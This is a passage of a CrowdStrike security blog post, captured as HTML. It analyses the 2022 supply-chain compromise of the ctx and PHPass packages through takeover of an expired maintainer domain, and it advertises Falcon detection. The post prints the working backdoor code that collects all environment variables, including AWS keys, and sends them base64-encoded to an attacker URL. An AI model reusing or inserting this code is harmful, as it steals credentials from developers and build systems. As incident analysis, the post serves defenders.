+                                        <div class="date">11/20/25 </div>
+                                    </dd>
+                                
+                                    <dd>
+                                        <a href="/en-us/blog/crowdstrike-stops-genai-data-leaks-with-unified-data-protection/">
+                                            <div class="image"><img src="https://assets.crowdstrike.com/is/image/crowdstrikeinc/Blog-FalCon25-StopGenAILeaks-FalconDataProtection-Thurs?wid=1060&hei=698&fmt=png-alpha&qlt=95,0&resMode=sharp2&op_usm=3.0,0.3,2,0" alt="CrowdStrike Stops GenAI Data Leaks with Unified Data Protection"/>
+                                            </div>
+                                            <div class="title">CrowdStrike Stops GenAI Data Leaks with Unified Data Protection</div>
+                                        </a>
+                                        <div class="date">09/18/25 </div>
+                                    </dd>
+                                
+                            </dl>
+                        </li>
+                    </ul>
+                </li>
+
+                <li class="blog_navigation_right_li_tab">
+                    <a href="https://www.crowdstrike.com/products/trials/try-falcon-prevent" class="blog_navigation_right_li_header userway-s7-active">Start Free Trial</a>
+                </li>
+            </ul>
+            <div id="blogMobileMenuBtn" class="mobile_nav_btn red"><span></span></div>
+        </div>
+    </div>
+</div>
+
+
+<div class="blog_navigation_mobile">
+    <div class="container">
+        <div class="row">
+            <div class="col-12">
+                <ul>
+                    <li>
+                        <a href="/en-us/blog/featured-articles/">Featured</a>
+                    </li>
+                    <li>
+                        <a href="/en-us/blog/recent-articles/">Recent</a>
+                    </li>
+                    <li>
+                        <a href="/en-us/blog/videos/">Video</a>
+                    </li>
+                    <li>
+                        <a href="/en-us/blog/categories-overview/">Category</a>
+                    </li>
+                    <li>
+                        <a href="https://www.crowdstrike.com/products/trials/try-falcon-prevent">Start Free Trial</a>
+                    </li>
+                </ul>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+    <div style="display: none;">
+        
+    </div>
+
+
+    
+
+        </div>
+    </div>
+</div>    </div>
+
+    
+</div>
+</div>
+
+    
+</div>
+
+    </div>
+
+    
+    
+    
+</div>
+
+    
+</div>
+<div class="cmp-wp-modal modal_insert_location aem-GridColumn aem-GridColumn--default--12">
+
+<div data-id="wistia_player_embed"></div>
+<div id="subscribe" class="container">
+    <div class="row">
+        <div class="col-lg-12">
+            <div id="modal-inner-mask" class="modal_mask">
+                <div class="close_button"><i data-id="modal-close" class="fa fa-close"></i></div>
+                <div class="modal-insert-wrapper">
+                    <div id="modal-insert" class="modal_content">
+                        
+                        
+                        
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+    <div style="display: none;">
+        
+    </div>
+
+
+    
+</div>
+<div class="container-wp container-wp--centered-blog container-wp--grid container-wp--num-col-2-right-sidebar-blog container-wp--num-col-2-right-sidebar-blog-desktop aem-GridColumn aem-GridColumn--default--12">
+    
+    
+    <div id="main-container" class="cmp-container-wp" data-cmp-is="responsive-grid-container" data-padding-top="128">
+        
+
+
+<div class="aem-Grid aem-Grid--12 aem-Grid--default--12 ">
+    
+    <div class="container-wp container-wp--main-content-blog aem-GridColumn aem-GridColumn--default--12">
+    
+    
+    <div id="container-08194d06fe" class="cmp-container-wp" data-cmp-is="responsive-grid-container" data-padding-left="16" data-padding-right="16">
+        
+
+
+<div class="aem-Grid aem-Grid--12 aem-Grid--default--12 ">
+    
+    <div class="headline aem-GridColumn aem-GridColumn--default--12">
+<div class="cmp-wp-headline" id="headline-en-us">
+    
+        <h1>Detecting Poisoned Python Packages: CTX and PHPass</h1>
+        
+        <div class="publish_info">
+            <p>June 03, 2022</p>
+            <span>•</span>
+            <a href="/en-us/blog/author.manoj-ahuje/" title="Posts by Manoj Ahuje" rel="author">
+                Manoj Ahuje</a>
+            <span>•</span>
+                
+            <a href="/en-us/blog/category.cloud-security/" title="Cloud &amp; Application Security">Cloud &amp; Application Security</a>
+        </div>
+        <div class="post_image">
+            <img width="1060" height="698" src="https://assets.crowdstrike.com/is/image/crowdstrikeinc/Blog_1060x698-5-3?wid=1060&hei=698&fmt=png-alpha&qlt=95,0&resMode=sharp2&op_usm=3.0,0.3,2,0" class="attachment-post-thumbnail size-post-thumbnail wp-post-image" alt="" decoding="async" fetchpriority="high" srcset="/content/dam/crowdstrike/www/en-us/wp/2022/06/Blog_1060x698-5.jpeg 1060w,https://assets.crowdstrike.com/is/image/crowdstrikeinc/Blog_1060x698-5-768x506?wid=768&amp;hei=506&amp;fmt=png-alpha&amp;qlt=95,0&amp;resMode=sharp2&amp;op_usm=3.0,0.3,2,0 768w,https://assets.crowdstrike.com/is/image/crowdstrikeinc/Blog_1060x698-5-1024x674?wid=1024&amp;hei=674&amp;fmt=png-alpha&amp;qlt=95,0&amp;resMode=sharp2&amp;op_usm=3.0,0.3,2,0 1024w,https://assets.crowdstrike.com/is/image/crowdstrikeinc/Blog_1060x698-5-300x198?wid=300&amp;hei=198&amp;fmt=png-alpha&amp;qlt=95,0&amp;resMode=sharp2&amp;op_usm=3.0,0.3,2,0 300w" sizes="(max-width: 1060px) 100vw, 1060px"/>
+        </div>
+    
+
+    
+</div>
+
+    <div style="display: none;">
+        
+    </div>
+
+
+    
+</div>
+<div class="text text--blog-content aem-GridColumn aem-GridColumn--default--12">
+
+
+
+<div class="cmp-text" id="text-8519616941" data-cmp-name="cmp-text-" data-cmp-is="text" data-target-location="false">
+    
+       <span><p><span style="	font-weight: 400;
+">The software supply chain remains a weak link for an attacker to exploit and gain access to an organization. According to a </span><a href="https://blog.sonatype.com/2021-state-of-the-software-supply-chain"><span style="	font-weight: 400;
+">report</span></a><span style="	font-weight: 400;
+"> in 2021, supply chain attacks increased by 650%, and some of the attacks have received a lot of limelight, such as </span><a href="/en-us/sunburst/"><span style="	font-weight: 400;
+">SUNBURST</span></a><span style="	font-weight: 400;
+"> in 2020 and </span><a href="https://portswigger.net/daily-swig/researcher-hacks-apple-microsoft-and-other-major-tech-companies-in-novel-supply-chain-attack"><span style="	font-weight: 400;
+">Dependency Confusion</span></a><span style="	font-weight: 400;
+"> in 2021.</span> <span style="	font-weight: 400;
+">On May 21, 2022, multiple Python community </span><a href="https://www.reddit.com/r/Python/comments/uwhzkj/i_think_the_ctx_package_on_pypi_has_been_hacked.html"><span style="	font-weight: 400;
+">Redditors</span></a><span style="	font-weight: 400;
+"> reported that the Python package </span><code><span style="	font-weight: 400;
+">ctx</span></code><span style="	font-weight: 400;
+"> was updated with malicious code after more than seven years of no changes, leading to removal of the package on May 24. Additionally, the domain used in the malicious code led to identification and removal of another PHP package, </span><code><span style="	font-weight: 400;
+">PHPass</span></code><span style="	font-weight: 400;
+">. Both packages were part of a deliberate attack that stole environment variables and any passwords stored as </span><code><span style="	font-weight: 400;
+">AWS_ACCESS_KEY_ID</span></code><span style="	font-weight: 400;
+"> and <code>AWS_SECRET_ACCESS_KEY</code>.</span> <span style="	font-weight: 400;
+">This attack highlighted a bigger issue where the Python repository </span><a href="https://pypi.org"><span style="	font-weight: 400;
+">PyPI</span></a><span style="	font-weight: 400;
+"> and php package repositories like packagist are hosting more than 500,000 packages combined. Over time, many such packages that are still popular are abandoned by developers and become high-risk and vulnerable to supply chain attacks in certain cases.</span> <span style="	font-weight: 400;
+">The CrowdStrike Falcon®<sup>®</sup> platform proactively protects customers against supply chain attacks with an adversarial-focused approach to cloud security.</span></p>
+<h2><span style="	font-weight: 400;
+">Account Takeover of Packages CTX and PHPass by Attackers</span></h2>
+<p><span style="	font-weight: 400;
+">In the case of </span><code><span style="	font-weight: 400;
+">ctx</span></code><span style="	font-weight: 400;
+"> and </span><code><span style="	font-weight: 400;
+">PhPass</span></code><span style="	font-weight: 400;
+">, attackers used a typical technique of a repository account takeover where the attacker tries to find a popular repository owned by an email whose domain has expired. Here the attacker just needs to re-register the same domain and re-create maintainers email to reset the repository account passwords. After that, the attacker owns the repository and is able to make desired changes (e.g., embed a malicious code in a release). Both </span><code><span style="	font-weight: 400;
+">ctx</span></code><span style="	font-weight: 400;
+"> and </span><code><span style="	font-weight: 400;
+">Phpass</span></code><span style="	font-weight: 400;
+"> packages were compromised using the same technique. Let’s take a closer look at </span><code><span style="	font-weight: 400;
+">ctx</span></code><span style="	font-weight: 400;
+">.</span> <code><span style="	font-weight: 400;
+">ctx</span></code><span style="	font-weight: 400;
+"> is a popular </span><a href="https://pypi.org"><span style="	font-weight: 400;
+">PyPI</span></a><span style="	font-weight: 400;
+"> hosted package that was abandoned by the original developer years ago. The last release on the package was December 19, 2014. The account owner&#39;s email and domain </span><code><span style="	font-weight: 400;
+">figlief&lt;.&gt;com</span></code><span style="	font-weight: 400;
+"> expired in December 2016.</span> <span style="	font-weight: 400;
+">On May 10, 2022, an unclassified actor made an initial unsuccessful attempt to reset password for the </span><code><code></code></code><span style="	font-weight: 400;
+">ctx account owner as per </span><a href="https://python-security.readthedocs.io/pypi-vuln/index-2022-05-24-ctx-domain-takeover.html"><span style="	font-weight: 400;
+">Python Security</span></a><span style="	font-weight: 400;
+">. On May 14, 2022, attackers were back with an account takeover strategy where they registered expired </span><code><span style="	font-weight: 400;
+">figlief&lt;.&gt;com</span></code><span style="	font-weight: 400;
+"> as shown in Figure 1. At this point attackers took control of the domain and were able to create the account owner&#39;s email address. With PyPI api attackers were able to reset the password for the account owner and, on the same day, they released the malicious versions of <code>ctx</code>.</span></p>
+<div class="wp-caption" id="attachment_122922"><img class="wp-image-122922" src="/content/dam/crowdstrike/www/en-us/wp/2022/06/Picture1-6.png" alt="" width="450" height="175"/>Figure 1. WHOIS data for domain registered by attackers on May 14, 2022</div>
+<p><span style="	font-weight: 400;
+">After taking control on the same day, attackers immediately replaced and released their own version with malicious code subsequently releasing more versions. Figure 2 shows the backdoor function </span><code><span style="	font-weight: 400;
+">sendRequest()</span></code><span style="	font-weight: 400;
+"> added to Ctx class. Function </span><code><span style="	font-weight: 400;
+">sendRequest()</span></code><span style="	font-weight: 400;
+"> is invoked whenever the ctx object is created. In some cases, it iterates through all the environment variables and looks for specific environment variables like </span><code><span style="	font-weight: 400;
+">AWS_ACCESS_KEY_ID</span></code><span style="	font-weight: 400;
+"> and </span><code><span style="	font-weight: 400;
+">AWS_SECRET_ACCESS_KEY</span></code><span style="	font-weight: 400;
+">. Then it encodes them as base64 string which is later sent to the attacker-controlled url https://anti-theft-web&lt;.&gt;herokuapp&lt;.&gt;com.</span></p>
+<pre>
+<code>class Ctx(dict):
+
+    def __init__(self):
+
+        <span style="	color: rgb(255,0,0);
+">self.sendRequest()</span>
+
+    def sendRequest(self):
+        string &#61; &#34;&#34;
+        for _, value in os.environ.items():
+            string &#43;&#61; value&#43;&#34; &#34;
+
+        message_bytes &#61; string.encode(&#39;ascii&#39;)
+        base64_bytes &#61; base64.b64encode(message_bytes)
+        base64_message &#61; base64_bytes.decode(&#39;ascii&#39;)
+
+        response &#61; requests.get(&#34;https://anti-theft-web.herokuapp.com/hacked.html&#34;&#43;base64_message)</code>
+</pre>
+<p style="	text-align: center;
+"><span style="	font-weight: 400;
+">Figure 2. Backdoor to steal environment variables</span></p>
+<p><span style="	font-weight: 400;
+">Here, heroku is a platform as a service (PaaS) that enables developers to build, run and operate applications entirely in the cloud. Attackers used it to host malicious data collectors which is a common attempt to blend into legitimate traffic.<p> </p>
+</span> <span style="	font-weight: 400;
+">If you installed </span><code><code></code></code><a href="https://pypistats.org/packages/ctx"><span style="	font-weight: 400;
+">ctx</span></a><span style="	font-weight: 400;
+">/<code>Phpass</code> or have continuous integration/continuous delivery (CI/CD) pipelines run to do so between May 14 and May 24 till the malicious packages were removed, you may have been compromised. At the time of writing, a student hacker from Turkey has claimed responsibility for the attack. Figure 3 shows approximate daily downloads of both packages — about 2,000 a day before they were taken down.</span></p>
+<div class="wp-caption" id="attachment_122924"><img class="size-full wp-image-122924" src="/content/dam/crowdstrike/www/en-us/wp/2022/06/Screen-Shot-2022-06-02-at-5.15.32-PM.png" alt="" width="1226" height="1072"/>Figure 3. Approximate per-day download of CTX and PHPass</div>
+<h2><span style="	font-weight: 400;
+">CrowdStrike Detection</span></h2>
+<p><span style="	font-weight: 400;
+">The Falcon platform proactively protects customers against supply chain attacks with its Falcon Cloud Workload Protection™ module. The platform keeps a track of the software bill of material (<a href="/cybersecurity-101/secops/software-bill-of-materials-sbom.html">SBOM</a>) of each cloud-native application by scanning each container image and hosts. It provides an in-depth view of application and OS dependencies, their versions and the vulnerabilities found in those dependencies. Additionally, it unlocks the Falcon platform to be able to detect any poisoned packages found in the wild, enabling discovery of any supply chain attacks exploiting the organization(shown in Figure 4). Figure 4 illustrates how CrowdStrike Falcon® detects and alerts customers on a poisoned Python package.</span></p>
+<div class="wp-caption" id="attachment_122925"><img class="size-full wp-image-122925" src="/content/dam/crowdstrike/www/en-us/wp/2022/06/Picture1-7.png" alt="" width="1762" height="1354"/>Figure 4. CrowdStrike detection for poisoned Python package</div>
+<h2><span style="	font-weight: 400;
+">Conclusion</span></h2>
+<p><a href="/en-us/cybersecurity-101/cyberattacks/supply-chain-attack/"><span style="	font-weight: 400;
+">Supply chain attacks</span></a><span style="	font-weight: 400;
+"> are on the rise and account takeover is one of the techniques attackers use that has the most impact with minimal efforts. The increased adoption of cloud, container and CI/CD pipelines to build and deploy code has expanded the modern enterprise’s attack surface and increased the complexity of defending it from attack. It puts them at greater risk of compromise with a bigger blast radius that can easily propagate through different production environments and across geographical boundaries in a matter of minutes.<p> </p>
+</span> <span style="	font-weight: 400;
+">To battle such attacks, enterprises must have a cloud-native arsenal that provides deeper visibility into cloud applications to know what’s being run under the hood; a Zero Trust approach to security; cloud workload behavior profiling; and the ability to audit and investigate breaches at large scale across cloud providers.</span> <span style="	font-weight: 400;
+">The CrowdStrike Falcon® platform continues to deliver tools required by enterprises to protect against breaches in the cloud or hybrid environments.</span></p>
+<h4><span style="	font-weight: 400;
+">Additional Resources</span></h4>
+<ul><li><i><span style="	font-weight: 400;
+">Learn how you can </span><a href="/en-us/cloud-security-products/"><span style="	font-weight: 400;
+">stop cloud breaches with CrowdStrike</span></a><span style="	font-weight: 400;
+"> unified cloud security posture management and breach prevention for multi-cloud and hybrid environments — all in one lightweight platform.</span></i></li><li><i><span style="	font-weight: 400;
+">Learn more about how </span><a href="/en-us/cloud-security-products/falcon-cloud-workload-protection/"><span style="	font-weight: 400;
+">Falcon Cloud Workload Protection</span></a><span style="	font-weight: 400;
+"> enables organizations to build, run and secure cloud-native applications with speed and confidence</span></i></li><li><i><span style="	font-weight: 400;
+">See if a managed solution is right for you. Find out about </span><a href="/en-us/products/cloud-security/falcon-cloud-workload-protection-complete/"><span style="	font-weight: 400;
+">Falcon Cloud Workload Protection Complete: Managed Detection and Response for Cloud Workloads</span></a><span style="	font-weight: 400;
+">.</span></i></li></ul>
+</span>
+    
+</div>
+
+    
+
+</div>
+<div class="sociallinks aem-GridColumn aem-GridColumn--default--12">
+<div class="cmp-social-links" id="sociallinks-en-us" data-target-location="false">
+
+    
+
+    
+
+    <a class="cmp-social-links__link" href="https://www.linkedin.com/shareArticle" target="_blank" rel="noopener noreferrer">
+        <svg class="cmp-social-links__link__icon">
+            <use href="#linked-in" xmlns:xlink="https://www.w3.org/1999/xlink" xlink:href="#linked-in"></use>
+        </svg>
+    </a>
+    <a class="cmp-social-links__link" href="https://twitter.com/share" target="_blank" rel="noopener noreferrer">
+        <svg class="cmp-social-links__link__icon">
+            <use href="#twitter-x-logo" xmlns:xlink="https://www.w3.org/1999/xlink" xlink:href="#twitter-x-logo"></use>
+        </svg>
+    </a>
+    
+    
+    
+    
+
+    
+
+    <!-- Personal Website Section -->
+    
+</div>
+
+    <div style="display: none;">
+        
+    </div>
+
+
+    
+</div>
+<div class="separator aem-GridColumn aem-GridColumn--default--12"><div id="separator-separator-7355ff50d4" class="cmp-separator" data-is-vertical="false" data-separator-height="1" data-separator-width="1" data-cmp-is="separator" data-separator-color="#C4C4C4" data-target-location="false">
+    <hr data-cmp-hook-separator="hr" class="cmp-separator__horizontal-rule"/>
+</div>
+
+
+
+
+
+
+
+
+
+</div>
+<div class="container responsivegrid aem-GridColumn aem-GridColumn--default--12">
+    
+    
+    
+    
+    <div data-attribute-name="data-promo-xf" data-cmp-is="xf-container" data-target-location="false">
+    </div>
+
+    
+</div>
+<div class="relatedcontent aem-GridColumn aem-GridColumn--default--12">
+<div class="cmp-wp-related-content" id="relatedcontent-en-us" data-target-location="false">
+    
+        <h4>Related Content</h4>
+        <div class="row recent_articles">
+            <a class="col-12 col-md-4 recent_articles_item" href="/en-us/blog/new-in-falcon-cloud-security-helping-security-teams-move-faster/">
+                <div class="post_image">
+                    <img src="https://assets.crowdstrike.com/is/image/crowdstrikeinc/Blog-FCS-July26?wid=2048&hei=1365&fmt=png-alpha&qlt=95,0&resMode=sharp2&op_usm=3.0,0.3,2,0" alt="Falcon Cloud Security July 2026 Release: Helping Security Teams Move Faster in the Cloud"/>
+                </div>
+                <div class="post_info">
+                    <div class="excerpt">
+                        Cloud &amp; Application Security | Jul 29, 2026
+                    </div>
+                    <h6>Falcon Cloud Security July 2026 Release: Helping Security Teams Move Faster in the Cloud</h6>
+                </div>
+            </a>
+        
+            <a class="col-12 col-md-4 recent_articles_item" href="/en-us/blog/new-in-falcon-cloud-security-expanding-multi-cloud-coverage/">
+                <div class="post_image">
+                    <img src="https://assets.crowdstrike.com/is/image/crowdstrikeinc/Blog-Cloud-Puzzle-Tech?wid=2048&hei=1349&fmt=png-alpha&qlt=95,0&resMode=sharp2&op_usm=3.0,0.3,2,0" alt="Falcon Cloud Security June 2026 Release: Updates for Azure and Google Cloud"/>
+                </div>
+                <div class="post_info">
+                    <div class="excerpt">
+                        Cloud &amp; Application Security | Jun 29, 2026
+                    </div>
+                    <h6>Falcon Cloud Security June 2026 Release: Updates for Azure and Google Cloud</h6>
+                </div>
+            </a>
+        
+            <a class="col-12 col-md-4 recent_articles_item" href="/en-us/blog/crowdstrike-state-of-cdr-survey-key-takeaways/">
+                <div class="post_image">
+                    <img src="https://assets.crowdstrike.com/is/image/crowdstrikeinc/Blog-CDRSurvey?wid=1060&hei=698&fmt=png-alpha&qlt=95,0&resMode=sharp2&op_usm=3.0,0.3,2,0" alt="94% of Organizations Report Cloud Breaches: CrowdStrike State of CDR Survey"/>
+                </div>
+                <div class="post_info">
+                    <div class="excerpt">
+                        Cloud &amp; Application Security | Jun 22, 2026
+                    </div>
+                    <h6>94% of Organizations Report Cloud Breaches: CrowdStrike State of CDR Survey</h6>
+                </div>
+            </a>
+        </div>
+    
+</div>
+
+
+    <div style="display: none;">
+        
+    </div>
+
+
+    
+</div>
+<div class="responsivegrid aem-GridColumn aem-GridColumn--default--12">
+
+
+<div class="aem-Grid aem-Grid--12 aem-Grid--default--12 ">
+    
+    
+    
+</div>
+</div>
+
+    
+</div>
+
+    </div>
+
+    
+    
+    
+</div>
+<div class="container-wp container-wp--right-sidebar-blog aem-GridColumn aem-GridColumn--default--12">
+    
+    
+    <div id="container-8d32d5a07e" class="cmp-container-wp" data-cmp-is="responsive-grid-container" data-padding-left="16" data-padding-right="16">
+        
+
+
+<div class="aem-Grid aem-Grid--12 aem-Grid--default--12 ">
+    
+    <div class="experiencefragment aem-GridColumn aem-GridColumn--default--12">
+
+    
+    
+
+
+
+<div class="aem-Grid aem-Grid--12 aem-Grid--default--12 ">
+    
+    <div class="responsivegrid aem-GridColumn aem-GridColumn--default--12">
+
+
+<div class="aem-Grid aem-Grid--12 aem-Grid--default--12 ">
+    
+    <div class="cmp-wp-modal modal_insert_location aem-GridColumn aem-GridColumn--default--12">
+
+<div data-id="wistia_player_embed"></div>
+<div id="subscribe" class="container">
+    <div class="row">
+        <div class="col-lg-12">
+            <div id="modal-inner-mask" class="modal_mask">
+                <div class="close_button"><i data-id="modal-close" class="fa fa-close"></i></div>
+                <div class="modal-insert-wrapper">
+                    <div id="modal-insert" class="modal_content">
+                        
+                            <div class="modal_form_embed">
+                                <iframe src="https://go.crowdstrike.com/NewsAndComms.html"></iframe>
+                            </div>
+                        
+                        
+                        
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+    <div style="display: none;">
+        
+    </div>
+
+
+    
+</div>
+<div class="categories aem-GridColumn aem-GridColumn--default--12">
+<div class="cmp-wp-categories" id="categories-en-us" data-target-location="false">
+    <div class="blog_subsection">
+        <div class="blog_section_subtitle">
+            <div class="title">Categories</div>
+        </div>
+    </div>
+    <div class="blog_featured_category_list">
+        <ul>
+            <li>
+                <a class="category-sidebar-link d-flex align-items-center" href="/en-us/blog/category.ai-machine-learning/">
+                    <div class="category-type ai-machine-learning">
+                        <img class="category-icon" src="/content/dam/crowdstrike/marketing/en-us/icons/Agentic-SOC-Blog-icon.svg"/>
+                    </div>
+                    <div class="category_name">Agentic SOC</div>
+                    <div class="count ml-auto">53</div>
+                </a>
+            </li>
+        
+            <li>
+                <a class="category-sidebar-link d-flex align-items-center" href="/en-us/blog/category.cloud-security/">
+                    <div class="category-type cloud-security">
+                        <img class="category-icon" src="/content/dam/crowdstrike/marketing/en-us/icons/blog/Cloud-Application-Security.svg"/>
+                    </div>
+                    <div class="category_name">Cloud &amp; Application Security</div>
+                    <div class="count ml-auto">148</div>
+                </a>
+            </li>
+        
+            <li>
+                <a class="category-sidebar-link d-flex align-items-center" href="/en-us/blog/category.data-security/">
+                    <div class="category-type data-security">
+                        <img class="category-icon" src="/content/dam/crowdstrike/marketing/en-us/icons/blog/data-protection-red.svg"/>
+                    </div>
+                    <div class="category_name">Data Security</div>
+                    <div class="count ml-auto">25</div>
+                </a>
+            </li>
+        
+            <li>
+                <a class="category-sidebar-link d-flex align-items-center" href="/en-us/blog/category.endpoint-protection/">
+                    <div class="category-type endpoint-protection">
+                        <img class="category-icon" src="/content/dam/crowdstrike/marketing/en-us/icons/Endpoint-Security-And-XDR.svg"/>
+                    </div>
+                    <div class="category_name">Endpoint Security &amp; XDR</div>
+                    <div class="count ml-auto">361</div>
+                </a>
+            </li>
+        
+            <li>
+                <a class="category-sidebar-link d-flex align-items-center" href="/en-us/blog/category.engineering-and-technology/">
+                    <div class="category-type engineering-and-technology">
+                        <img class="category-icon" src="/content/dam/crowdstrike/marketing/en-us/icons/blog/Engineering-and-Tech.svg"/>
+                    </div>
+                    <div class="category_name">Engineering &amp; Tech</div>
+                    <div class="count ml-auto">87</div>
+                </a>
+            </li>
+        
+            <li>
+                <a class="category-sidebar-link d-flex align-items-center" href="/en-us/blog/category.executive-viewpoint/">
+                    <div class="category-type executive-viewpoint">
+                        <img class="category-icon" src="/content/dam/crowdstrike/marketing/en-us/icons/blog/Exec-Viewpoint.svg"/>
+                    </div>
+                    <div class="category_name">Executive Viewpoint</div>
+                    <div class="count ml-auto">181</div>
+                </a>
+            </li>
+        
+            <li>
+                <a class="category-sidebar-link d-flex align-items-center" href="/en-us/blog/category.exposure-management/">
+                    <div class="category-type exposure-management">
+                        <img class="category-icon" src="/content/dam/crowdstrike/marketing/en-us/icons/BlogIcon-test-image-2.svg"/>
+                    </div>
+                    <div class="category_name">Exposure Management</div>
+                    <div class="count ml-auto">123</div>
+                </a>
+            </li>
+        
+            <li>
+                <a class="category-sidebar-link d-flex align-items-center" href="/en-us/blog/category.from-the-front-lines/">
+                    <div class="category-type from-the-front-lines">
+                        <img class="category-icon" src="/content/dam/crowdstrike/marketing/en-us/icons/blog/Front-Lines.svg"/>
+                    </div>
+                    <div class="category_name">From The Front Lines</div>
+                    <div class="count ml-auto">205</div>
+                </a>
+            </li>
+        
+            <li>
+                <a class="category-sidebar-link d-flex align-items-center" href="/en-us/blog/category.identity-protection/">
+                    <div class="category-type identity-protection">
+                        <img class="category-icon" src="/content/dam/crowdstrike/marketing/en-us/icons/Identity-Protection.svg"/>
+                    </div>
+                    <div class="category_name">Next-Gen Identity Security</div>
+                    <div class="count ml-auto">74</div>
+                </a>
+            </li>
+        
+            <li>
+                <a class="category-sidebar-link d-flex align-items-center" href="/en-us/blog/category.observability-and-log-management/">
+                    <div class="category-type observability-and-log-management">
+                        <img class="category-icon" src="/content/dam/crowdstrike/marketing/en-us/icons/blog/Next-Gen-SIEM-LOG-Management.svg"/>
+                    </div>
+                    <div class="category_name">Next-Gen SIEM &amp; Log Management</div>
+                    <div class="count ml-auto">116</div>
+                </a>
+            </li>
+        
+            <li>
+                <a class="category-sidebar-link d-flex align-items-center" href="/en-us/blog/category.public-sector/">
+                    <div class="category-type public-sector">
+                        <img class="category-icon" src="/content/dam/crowdstrike/marketing/en-us/icons/blogicon-test-4.png"/>
+                    </div>
+                    <div class="category_name">Public Sector</div>
+                    <div class="count ml-auto">43</div>
+                </a>
+            </li>
+        
+            <li>
+                <a class="category-sidebar-link d-flex align-items-center" href="/en-us/blog/category.securing-ai/">
+                    <div class="category-type securing-ai">
+                        <img class="category-icon" src="/content/dam/crowdstrike/marketing/en-us/icons/blogicon-test-3.svg"/>
+                    </div>
+                    <div class="category_name">Securing AI</div>
+                    <div class="count ml-auto">49</div>
+                </a>
+            </li>
+        
+            <li>
+                <a class="category-sidebar-link d-flex align-items-center" href="/en-us/blog/category.counter-adversary-operations/">
+                    <div class="category-type counter-adversary-operations">
+                        <img class="category-icon" src="/content/dam/crowdstrike/marketing/en-us/icons/blog/Counter-Adversary-Ops.svg"/>
+                    </div>
+                    <div class="category_name">Threat Hunting &amp; Intel</div>
+                    <div class="count ml-auto">221</div>
+                </a>
+            </li>
+        </ul>
+    </div>
+</div>
+
+    <div style="display: none;">
+        
+    </div>
+
+
+    
+</div>
+<div class="ghost aem-GridColumn aem-GridColumn--default--12">
+
+</div>
+<div class="ghost aem-GridColumn aem-GridColumn--default--12">
+
+</div>
+<div class="ghost aem-GridColumn aem-GridColumn--default--12">
+
+</div>
+<div class="ghost aem-GridColumn aem-GridColumn--default--12">
+
+</div>
+<div class="ghost aem-GridColumn aem-GridColumn--default--12">
+
+</div>
+<div class="injectioncontainer aem-GridColumn aem-GridColumn--default--12">
+    
+
+<div id="injectioncontainer-en-us" class="cmp-injection-container" data-target-location="false">
+    
+    
+    
+    <style>.cmp-wp-cards{align-items:center;display:flex;flex-direction:column;justify-content:space-between}.cmp-wp-cards h6{font-size:1pc;font-weight:500}.cmp-wp-cards h5,.cmp-wp-cards h6{font-family:crowdstrike-sharp-sans,helvetica,arial,sans-serif;font-style:normal;line-height:125%}.cmp-wp-cards h5{font-size:24px;font-weight:700}.cmp-wp-cards p{font-family:neue-haas-grotesk-display-pro,helvetica,arial,sans-serif;font-size:1pc;font-style:normal;font-weight:500;line-height:125%}.cmp-wp-cards .button{flex-direction:row;gap:10px;width:auto}.cmp-wp-cards .button,.cmp-wp-cards .button button{align-items:center;display:flex;justify-content:center}.cmp-wp-cards .button button{border-radius:8px;color:#fff;gap:5px;padding:9pt 1pc}.cmp-wp-cards .button button a{font-family:neue-haas-grotesk-display-pro,helvetica,arial,sans-serif;font-size:1pc;font-style:normal;font-weight:500;line-height:125%}.cmp-wp-cards .button button svg{filter:none;height:9pt;width:9pt}.cmp-wp-cards .button .priomary-btn{background:#ec0000;border:1px solid #ec0000;transition:background-color .2s ease-out,border-color .2s ease-out,color .2s ease-out;width:100%}.cmp-wp-cards .button .priomary-btn:hover{background:#c01f11}.cmp-wp-cards .button .priomary-btn a{color:#fff}.cmp-wp-cards .button .black-white-btn{background:#fff;border:1px solid #fff;color:#000;transition:background-color .2s ease-out,border-color .2s ease-out,color .2s ease-out}.cmp-wp-cards .button .black-white-btn svg{filter:invert(100%)!important}.cmp-wp-cards .button .black-white-btn a{color:#000}.cmp-wp-cards .button .black-white-btn:hover{background:#000;border-color:#000}.cmp-wp-cards .button .black-white-btn:hover a{color:#fff}.cmp-wp-cards .button .black-white-btn:hover svg{filter:none!important}.cmp-wp-cards .button .transparent-btn{background:transparent;border:1px solid #fff;transition:border-color .2s ease-out,border-color .2s ease-out,color .2s ease-out}.cmp-wp-cards .button .transparent-btn a{color:#fff}.cmp-wp-cards .button .transparent-btn:hover{border-color:#000}.cmp-wp-cards .cmp-wp-content{border-radius:1pc;display:flex;flex-direction:column;justify-content:space-between;min-height:290px;padding:2pc 20px}.cmp-wp-cards .cmp-wp-card-common{background-position:50%;background-repeat:no-repeat;background-size:cover;border-radius:1pc;margin:1pc 0}.cmp-wp-cards .cmp-wp-card-one{text-align:center;width:100%}.cmp-wp-cards .cmp-wp-card-one h5{padding:0 9pt}.cmp-wp-cards .cmp-wp-card-three .cmp-wp-content,.cmp-wp-cards .cmp-wp-card-two .cmp-wp-content{padding:40px 20px}.cmp-wp-cards .cmp-wp-card-three h5,.cmp-wp-cards .cmp-wp-card-three p,.cmp-wp-cards .cmp-wp-card-two h5,.cmp-wp-cards .cmp-wp-card-two p{color:#fff}.cmp-wp-cards .cmp-wp-card-three,.cmp-wp-cards .cmp-wp-card-two{text-align:center;width:100%}.cmp-wp-cards .cmp-wp-card-three .cmp-wp-content{justify-content:end}.cmp-wp-cards .cmp-wp-card-three h5{margin-bottom:0;padding-bottom:2pc}
+</style>
+
+    
+        <div class="cmp-wp-cards">
+    <div class="cmp-wp-card-one cmp-wp-card-common" id="card-1" style="background-image: url('/content/dam/crowdstrike/marketing/en-us/images/blog/blog-article-page/card-1.png');">
+        <div class="cmp-wp-content">
+            <h6>CrowdStrike Falcon Platform </h6>
+            <h5>Ready to protect your business? </h5>
+            <p>Try CrowdStrike free today</p>
+            <div class="button">
+                <button class="priomary-btn">
+                    <a href="https://www.crowdstrike.com/products/trials/try-falcon-prevent">Start free trial</a>
+                    <svg>
+                        <use href="#white-arrow" xmlns:xlink="https://www.w3.org/1999/xlink" xlink:href="#cta-arrow-white"></use>
+                    </svg>
+                </button>
+            </div>
+        </div>
+    </div>
+    <div class="cmp-wp-card-two cmp-wp-card-common" id="card-2" style="background-image: url('/content/dam/crowdstrike/marketing/en-us/images/blog/blog-article-page/card-2.jpg');">
+        <div class="cmp-wp-content">
+            <h5>Subscribe</h5>
